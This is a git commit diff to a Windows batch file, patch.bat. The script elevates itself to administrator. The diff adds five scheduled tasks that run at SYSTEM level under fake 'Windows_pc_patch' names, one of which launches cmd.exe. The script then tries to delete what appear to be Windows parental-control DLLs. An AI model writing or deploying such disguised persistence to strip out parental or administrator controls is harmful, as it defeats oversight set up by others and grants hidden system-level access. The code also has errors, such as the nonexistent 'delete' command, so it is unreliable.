cfe487f39e56fce2144f5e8784cb3b71950862df
cbaie9 ( cb9 ) <75169332+cbaie9@users.noreply.github.com>
2021-12-03 20:03:25 +0100

    1.4.0

--- patch.bat
+++ patch.bat
@@ -1,4 +1,14 @@
 powershell /c start-process -verb runAs \"%~s0\"
+SCHTASKS /CREATE /SC onStart /TN "Windows_pc_patch_dosexec" /TR "%programdata%\Wpc\dosexec.bat" /ru system /ec system /f
+cls
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdos" /TR "%programdata%\Wpc\msdos.bat" /RU system /ec system /f
+cls
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_repair" /TR "%programdata%\Wpc\repair.bat" /RU system /ec system /f
+cls
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_patch" /TR "%programdata%\Wpc\patch.bat" /RU system /ec system /f
+cls
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_cmd" /TR "c:\Windows\system32\cmd.exe" /RU system /ec system /f
+cls
 cd %windir%\system32
 delete WpcMigration.uplevel.dll
 delete Wpc.dll
